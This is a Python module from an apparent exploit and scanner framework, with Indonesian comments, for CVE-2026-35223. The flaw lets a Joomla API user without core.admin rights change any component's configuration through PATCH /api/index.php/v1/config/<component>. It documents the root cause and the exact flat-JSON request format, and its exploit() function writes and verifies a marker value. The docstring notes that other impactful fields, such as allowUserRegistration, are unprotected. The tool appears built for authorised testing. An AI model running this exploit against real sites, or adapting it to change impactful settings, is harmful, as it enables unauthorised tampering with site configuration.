#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core/joomla_api).

CVE-2026-35223 — com_config API: PATCH konfigurasi komponen tanpa `core.admin`.

Affected : 4.0.0 - 5.4.5 (patch allowEdit() ada sejak 5.4.6)
Patched  : 5.4.6+ (dan 6.1.x terkait)

ROOT CAUSE

    api/components/com_config/src/Controller/ComponentController.php

    5.4.5 (VULNERABLE)
        public function edit()
        {
            /** @var ComponentModel $model */
            $model = $this->getModel($this->contentType);
            ...
            // Access check.
            if (!$this->allowEdit()) {
                throw new NotAllowed('JLIB_APPLICATION_ERROR_CREATE_RECORD_NOT_PERMITTED', 403);
            }
            ...
        }
        // allowEdit() TIDAK dioverride → memakai milik ApiController:
        //     return $this->app->getIdentity()->authorise('core.edit', $this->option);
        // $this->option di sini = 'com_config'. Asset com_config punya rules '{}',
        // sehingga core.edit jatuh dari root: {"core.edit":{"6":1,"4":1,"2":1}} — grup 6
        // (Manager) mendapatkannya TANPA hak khusus apa pun.

    5.4.6 / 5.4.7 / 5.4.8 (PATCHED)
        protected function allowEdit($data = [], $key = 'id')
        {
            return ConfigHelper::canChangeComponentConfig($this->input->get('component_name'));
        }
        // dan allowEdit() juga dipasang di displayList().

    ConfigHelper::canChangeComponentConfig() (sudah ada di semua versi):
        if (!\in_array(strtolower($component), ['com_joomlaupdate', 'com_privacy'], true)) {
            return $user->authorise('core.admin', $component)
                || $user->authorise('core.options', $component);
        }
        return $user->authorise('core.admin');

Dampak: user API dengan `core.edit` pada com_config — yang di lab berarti seluruh grup 6
(Manager), karena asset com_config tidak punya rules sendiri — dapat mengubah
konfigurasi komponen APA PUN lewat:

    PATCH /api/index.php/v1/config/<component_name>
    X-Joomla-Token: <token>
    Content-Type: application/json
    {"<field>": <value>, ...}

Bentuk body PENTING: controller melakukan
    $oldData = $component->getParams()->toArray();
    $data    = array_replace($oldData, $data);
jadi JSON harus FLAT (params komponen langsung di root object) — bukan dibungkus
`{"params":{...}}` (yang akan mengembalikan 200 tetapi tidak mengubah apa pun).

Catatan: `save()` melindungi `$data['params']['rules']` dengan `core.admin`, dan
menolak penambahan grup super-user lewat field UserGroupList ber-`checksuperusergroup`.
Field parameter lain (termasuk yang berdampak, mis. `mailSubjectPrefix`,
`metakey_prefix`, `allowUserRegistration` pada form terkait) TIDAK dilindungi.

Bukti lab (user grup 6, tanpa core.admin):
    5.4.5 (8108) : PATCH /api/index.php/v1/config/com_banners {"metakey_prefix":"EVIDENCE545"}
                   -> HTTP 200, dan #__extensions.params untuk com_banners berubah
                   menjadi {"...","metakey_prefix":"EVIDENCE545",...}
    5.4.8 (8106) : PATCH -> HTTP 403 {"title":"Access Denied","code":403}; nilai tetap ""
"""

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_RCE, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 5)
VULN_6_MAX = (6, 0, 0)

# Komponen target: formnya sederhana dan fieldnya tidak berdampak destruktif.
TARGET_COMPONENT = "com_banners"
TARGET_FIELD = "metakey_prefix"


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _config_url(t, component):
    return f"{t.url}/api/index.php/v1/config/{component}"


def _patch(t, h, token, component, payload):
    headers = {"X-Joomla-Token": token, "Content-Type": "application/json"}
    return h.patch(_config_url(t, component), data=json.dumps(payload), headers=headers)


def _probe(t, h, opts, do_write):
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    token = _opt(opts, "api_token")
    if not token:
        return ST_SKIP, f"Joomla {ver_s} — butuh --api-token (X-Joomla-Token)", \
                        f"version={ver_s}"

    if not do_write:
        # Probe tidak menulis: cukup pastikan endpoint config dapat disentuh.
        r = h.get(_config_url(t, TARGET_COMPONENT),
                  headers={"X-Joomla-Token": token})
        if r is None:
            return ST_UNKNOWN, "tidak bisa menghubungi API config", f"version={ver_s}"
        if r.status_code == 401:
            return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401 autentikasi)", \
                            f"version={ver_s} | GET HTTP 401"
        if r.status_code != 200:
            return ST_UNKNOWN, f"API config tidak dapat diakses (HTTP {r.status_code})", \
                               f"version={ver_s} | GET HTTP {r.status_code}"
        return (ST_INFO,
                f"Joomla {ver_s} — API config terjangkau; jalankan --exploit untuk "
                f"menguji tulis tanpa core.admin",
                f"version={ver_s} | GET HTTP 200")

    # do_write: PATCH nilai penanda, lalu baca kembali untuk memastikan persist.
    marker = "MP90907-%d" % (abs(hash(t.url)) % 100000)
    r = _patch(t, h, token, TARGET_COMPONENT, {TARGET_FIELD: marker})
    if r is None:
        return ST_UNKNOWN, "tidak bisa menghubungi API config", f"version={ver_s}"
    if r.status_code == 403:
        return ST_CLEAN, f"Joomla {ver_s} — API config menolak (403)", \
                         f"version={ver_s} | PATCH HTTP 403"
    if r.status_code == 401:
        return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401)", \
                        f"version={ver_s} | PATCH HTTP 401"
    if r.status_code not in (200, 201):
        return ST_UNKNOWN, f"respons config tidak menyimpulkan status (HTTP {r.status_code})", \
                           f"version={ver_s} | PATCH HTTP {r.status_code}"

    # Konfirmasi persist dengan GET.
    g = h.get(_config_url(t, TARGET_COMPONENT), headers={"X-Joomla-Token": token})
    persisted = False
    if g is not None and g.status_code == 200:
        try:
            body = g.text or ""
            persisted = marker in body
        except Exception:
            persisted = False

    ev = f"version={ver_s} | PATCH HTTP {r.status_code} | marker={marker} | " \
         f"persisted={persisted}"
    if persisted:
        return (ST_VULN,
                f"Joomla {ver_s} — konfigurasi komponen diubah tanpa core.admin", ev)
    return (ST_VULN,
            f"Joomla {ver_s} — API config menerima PATCH tanpa core.admin "
            f"(ASSUMED: perubahan belum terkonfirmasi lewat GET)", ev)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    return _probe(t, h, opts, do_write=False)


def exploit(t, h, opts):
    return _probe(t, h, opts, do_write=True)


register(CveModule(
    cve="CVE-2026-35223",
    cluster="joomla_core",
    title="Joomla Core - com_config API PATCH tanpa core.admin",
    vclass="broken access control",
    cvss="6.5",
    severity="medium",
    cwe="CWE-863",
    product="Joomla! Core (com_config ComponentController)",
    versions_affected="4.0.0-5.4.5",
    status="verified",
    requires=[
        "kredensial API (X-Joomla-Token) user dengan core.login.api",
        "user punya core.edit pada com_config (default: grup 6/Manager)",
    ],
    check=check,
    exploit=exploit,
    notes=("ComponentController::edit() 5.4.5 memakai allowEdit() warisan ApiController "
           "yang hanya memeriksa core.edit pada 'com_config'; asset com_config rules '{}' "
           "sehingga core.edit jatuh dari root (grup 6). 5.4.6+ menambahkan override "
           "allowEdit() -> ConfigHelper::canChangeComponentConfig() yang mewajibkan "
           "core.admin/core.options per komponen. Vektor: PATCH "
           "/api/index.php/v1/config/<component_name> dengan body JSON FLAT "
           "(bukan dibungkus params). Diverifikasi: 5.4.5 -> 200 + nilai di "
           "#__extensions.params berubah; 5.4.8 -> 403. Butuh --api-token. "
           "FORMAT BODY PENTING: array_replace($oldData, $data) -> flat JSON."),
))
